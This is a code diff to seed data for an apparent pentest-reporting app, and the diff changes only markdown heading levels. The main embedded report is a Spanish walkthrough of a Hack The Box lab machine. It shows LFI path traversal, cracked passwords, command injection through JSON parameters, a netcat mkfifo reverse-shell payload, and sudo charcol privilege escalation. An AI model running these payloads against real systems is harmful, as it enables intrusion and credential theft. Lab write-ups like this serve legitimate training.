@@ -15,7 +15,7 @@ export const initialProjects: Project[] = [
     endDate: '2025-10-14',
     createdAt: formatISO(sub(now, { weeks: 1 })),
     updatedAt: formatISO(sub(now, { weeks: 1 })),
-    reportBody: `## Información General
+    reportBody: `# Información General
 - **Nombre de la máquina:** Imagery
 - **IP:** 10.10.11.88
 - **Sistema Operativo:** Linux
@@ -23,13 +23,13 @@ export const initialProjects: Project[] = [
 - **Fecha:** 14-10-2025
 
 ---
-## Reconocimiento Inicial
-### Añadir IP a /etc/hosts
+# Reconocimiento Inicial
+## Añadir IP a /etc/hosts
 \`\`\`bash
 echo "10.10.11.88 imagery.htb" | sudo tee -a /etc/hosts
 \`\`\`
-### Escaneo de Puertos (Nmap)
-#### Simple Scan
+## Escaneo de Puertos (Nmap)
+## Simple Scan
 \`\`\`bash
 sudo nmap -v -sV -T5 10.10.11.88
 \`\`\`
@@ -42,7 +42,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 *Encontramos 2 puertos abiertos, destacando el puerto 8000 que corre un servidor Werkzeug.*
 
 ---
-#### Escaneo Avanzado
+## Escaneo Avanzado
 Podemos usar Visual Map con un escaneo en XML para detectar posibles vulnerabilidades o vectores de entrada:
 \`\`\`bash
 sudo nmap -v -A 10.10.11.88 -oX scan.xml
@@ -65,10 +65,10 @@ OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
 \`\`\`
 
 ---
-## Análisis con Visual Map
+# Análisis con Visual Map
 [Visual-Map](https://github.com/afsh4ck/Visual-Map)
 
-### Resumen de Scripts NSE
+## Resumen de Scripts NSE
 Este análisis de scripts NSE revela la presencia de dos servicios clave:
 - **Servicio SSH:** Se identificaron claves de host ECDSA y ED25519, lo que confirma la ejecución de un servidor SSH.
 - **Servicio Web (HTTP):**
@@ -77,18 +77,18 @@ Este análisis de scripts NSE revela la presencia de dos servicios clave:
   - La tecnología subyacente del servidor es Werkzeug/3.1.3 sobre Python/3.12.7.
 
 ---
-## Acceso Web
+# Acceso Web
 Accedemos a http://10.10.11.88:8000/ y observamos que parece ser una galería de fotos online. Nos registraremos para ver la aplicación web por dentro. Una vez dentro vemos que podemos subir una imagen, por lo que puede ser el vector de entrada principal.
 
-### Prueba de subida de archivos
+## Prueba de subida de archivos
 Después de probar multitud de técnicas de subidas de archivos, doble extensión de archivos, MIME Types, bypass de blacklists, etc... parece que no podemos ejecutar PHP de ninguna manera, por lo que este vector de entrada queda descartado en principio.
 
 ---
-## XSS
+# XSS
 Encontramos en el footer un apartado de la web que no habíamos visto antes, un apartado para reportar un bug. De forma responsable no incluimos aquí cargas útiles activas ni redirecciones externas que exfiltren cookies; en su lugar se documenta la vulnerabilidad y la prueba de concepto de forma segura.
 
 ---
-## Admin panel
+# Admin panel
 Al editar la cookie y recargar la página vemos un panel de administración donde podemos descargarnos un log del usuario y el administrador de la web. El log no contiene nada interesante:
 \`\`\`
 cat admin@imagery.htb.log 
@@ -100,12 +100,12 @@ cat admin@imagery.htb.log
 \`\`\`
 
 ---
-## Local File Inclusion (LFI)
+# Local File Inclusion (LFI)
 Al capturar el request de descarga de log, encontramos un parámetro \`log_identifier\` que es vulnerable a LFI, permitiéndonos ver el contenido de archivos cómo el etc/passwd: \`GET /admin/get_system_log?log_identifier=../../../../../etc/passwd\`. Encontramos un usuario \`mark\` con shell y que nos llama la atención.
 
 ---
-## Dumpeo de variables de entorno y usuario actual
-### Credenciales de admin
+# Dumpeo de variables de entorno y usuario actual
+## Credenciales de admin
 Las credenciales del administrador y el usuario de prueba las encontramos en \`db.json\` en \`config.py\`, que es el archivo de configuración común junto con \`app.py\` en los servidores Python.
 \`\`\`json
 "users": [
@@ -131,7 +131,7 @@ Las credenciales del administrador y el usuario de prueba las encontramos en \`d
         },
 ]
 \`\`\`
-### Cracking de hashes
+## Cracking de hashes
 Solamente conseguimos crackear la contraseña del usuario de prueba: \`iambatman\`. No podemos conectarnos directamente por SSH: \`ssh testuser@imagery.htb # Permission denied (publickey).\`. Así que nos loguearemos directamente con su usuario en la web. Observamos que este usuario tiene desbloqueadas algunas funcionalidades que un usuario normal no tiene. Por ejemplo al subir una imagen legítima y hacer click en las opciones de la imagen, vemos que ahora tenemos todas desbloqueadas, cuando antes solamente teníamos Download y Delete. Hay una funcionalidad interesante de \`visual image transformation\`, con la que podemos transformar una imagen y pasa varios parámetros en un JSON:
 \`\`\`json
 "params":{
@@ -143,7 +143,7 @@ Solamente conseguimos crackear la contraseña del usuario de prueba: \`iambatman
 \`\`\`
 
 ---
-## RCE a través de JSON
+# RCE a través de JSON
 Le inyectaremos un comando en el primer valor para hacer la comprobación. Haremos un curl y intentaremos inyectar un comando de S.O. como \`whoami\`:
 \`\`\`json
 "params":{
@@ -155,14 +155,14 @@ Le inyectaremos un comando en el primer valor para hacer la comprobación. Harem
 \`\`\`
 Recibimos el test en nuestra terminal en entorno controlado; en este repositorio se han eliminado cargas útiles activas para evitar redirecciones o exfiltración accidental.
 
-### Ganando la shell
+## Ganando la shell
 Abrimos un listener de netcat en nuestro equipo atacante: \`nc -nlvp 8888\`. Y usaremos el siguiente payload para devolvernos una conexión de netcat y ganar la shell: \`;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.100 8888 >/tmp/f;\`. Estamos dentro!
 \`\`\`bash
 $ whoami
 web
 \`\`\`
 
-### Tratamiento de la TTY
+## Tratamiento de la TTY
 Tenemos una shell limitada, por lo que haremos el tratamiento de la TTY para movernos mejor:
 \`\`\`bash
 $ python -c 'import pty; pty.spawn("/bin/bash")'
@@ -170,7 +170,7 @@ web@Imagery:~/web$
 \`\`\`
 
 ---
-## Credential hunting
+# Credential hunting
 Buscaremos credenciales para seguir moviéndonos por el sistema. Encontramos un archivo de backup pero está cifrado:
 \`\`\`bash
 cd var/backup
@@ -178,7 +178,7 @@ ls
 # web_20250806_120723.zip.aes
 \`\`\`
 
-### Cracking de ZIP con cifrado AES
+## Cracking de ZIP con cifrado AES
 No podemos extraerlo directamente. Nos enviamos el archivo backup a nuestra máquina de atacante para trabajar mejor y lo crackeamos con el siguiente script de python:
 \`\`\`python
 #!/usr/bin/env python3
@@ -228,7 +228,7 @@ sys.exit(2)
 Al ejecutarlo obtenemos una contraseña en plano: \`bestfriends\`. Al leer el archivo \`db.json\` del backup, esta vez si conseguimos el hash del usuario \`mark\` y con crackstation lo crackeamos al instante: \`supersmash\`
 
 ---
-## User Flag
+# User Flag
 No podemos acceder por SSH, por lo que cambiaremos al usuario mark desde la propia shell que ya tenemos:
 \`\`\`bash
 su mark
@@ -240,8 +240,8 @@ cat /home/mark/user.txt
 \`\`\`
 
 ---
-## Escalada de Privilegios
-### Enumeración de Privilegios
+# Escalada de Privilegios
+## Enumeración de Privilegios
 Tenemos permisos de ejecución como root en el ejecutable \`charcol\`: \`sudo -l\`. Al ejecutarlo con \`sudo charcol shell\` nos pide una contraseña, pero podemos resetearlo con la flag \`-R\`:
 \`\`\`bash
 sudo charcol -R
@@ -250,14 +250,14 @@ sudo charcol -R
 \`\`\`
 Ahora ya no pedirá contraseña al ejecutarlo.
 
-### Obtener la Root Flag con Charcol
+## Obtener la Root Flag con Charcol
 Usaremos el siguiente comando de charcol para copiar la root flag a nuestro directorio principal de mark:
 \`\`\`
 charcol> auto add --schedule "* * * * *" --command "cat /root/root.txt > /home/.flag" --name "root_flag" --log-output /home/.flag
 \`\`\`
 
 ---
-## 👑 Root Flag
+# 👑 Root Flag
 En el directorio \`/home\` nos encontramos la flag de root:
 \`\`\`bash
 cat /home/.flag
@@ -269,29 +269,29 @@ Podríamos hacer lo mismo para conseguir el \`id_rsa\` de root (si lo tiene) y a
     id: 'proj-1',
     clientId: 'cli-htb',
     name: 'Q3 Web App Pentest',
-    reportBody: `## Executive Summary
+    reportBody: `# Executive Summary
 This report details the findings of the penetration test conducted on **Q3 Web App Pentest** for **Hack The Box** between 2023-07-01 and 2023-07-15. The assessment identified **2** total vulnerabilities, including **1** critical and **1** high-risk findings. Urgent remediation is recommended for critical vulnerabilities to mitigate potential impact.
 
 ---
-## Scope & Methodology
+# Scope & Methodology
 The assessment was conducted from the perspective of an external, unauthenticated attacker (black-box).
 
-### Scope
+## Scope
 - Web Applications: *.hackthebox.eu, api.hackthebox.eu
 - External Network: 138.68.128.0/24
 
-### Methodology
+## Methodology
 1. **Reconnaissance:** Discovering subdomains, open ports, and services.
 2. **Vulnerability Scanning:** Using automated tools to identify common vulnerabilities.
 3. **Manual Verification & Exploitation:** Manually validating findings and attempting to exploit identified weaknesses.
 4. **Reporting:** Documenting vulnerabilities and providing remediation guidance.
 
 ---
-## Attack Narrative
+# Attack Narrative
 The engagement began with reconnaissance against the *.hackthebox.eu domain, which revealed the existence of an outdated blog and a development server with directory listing enabled. An SQL Injection vulnerability was discovered and exploited on the main web application's login form, allowing for authentication bypass. This access was leveraged to uncover a Stored XSS vulnerability in the user profile section, which could be used to target other users, including administrators.
 
 ---
-## Findings Classification
+# Findings Classification
 | Severity | CVSS v3.1 Score | Description |
 |:---|---|:---|
 | <span style="color:red">Critical</span> | 9.0 - 10.0 | Vulnerabilities that could lead to immediate system compromise. |
@@ -312,17 +312,17 @@ The engagement began with reconnaissance against the *.hackthebox.eu domain, whi
     id: 'proj-2',
     clientId: 'cli-ine',
     name: 'Análisis de Red Interna',
-    reportBody: `## Resumen Ejecutivo
+    reportBody: `# Resumen Ejecutivo
 Este informe detalla los hallazgos de la evaluación de seguridad de la red interna para **INE Security**, realizada entre el 10-08-2023 y el 20-08-2023. El objetivo era identificar vulnerabilidades explotables desde la perspectiva de un actor malicioso con acceso a la red corporativa. Se descubrieron múltiples debilidades, incluyendo el uso de credenciales por defecto en servicios críticos y software sin parches que permitieron la escalada de privilegios hasta el nivel de Administrador de Dominio. Se recomienda la remediación inmediata de los hallazgos críticos.
 
 ---
-## Alcance y Metodología
-### Alcance
+# Alcance y Metodología
+## Alcance
 - Rangos IP: 10.10.0.0/16
 - Supuestos: La evaluación se realiza desde la perspectiva de un atacante que ha obtenido un punto de apoyo en la red interna (p.ej., una estación de trabajo comprometida).
 - Exclusiones: No se realizaron pruebas que pudieran causar una denegación de servicio en sistemas de producción críticos.
 
-### Metodología
+## Metodología
 1. **Descubrimiento de Activos:** Identificación de hosts activos, puertos y servicios en la red.
 2. **Enumeración de Servicios:** Análisis de servicios para identificar versiones, configuraciones y posibles vulnerabilidades.
 3. **Explotación y Movimiento Lateral:** Intento de explotar vulnerabilidades para ganar acceso y moverse a través de la red.
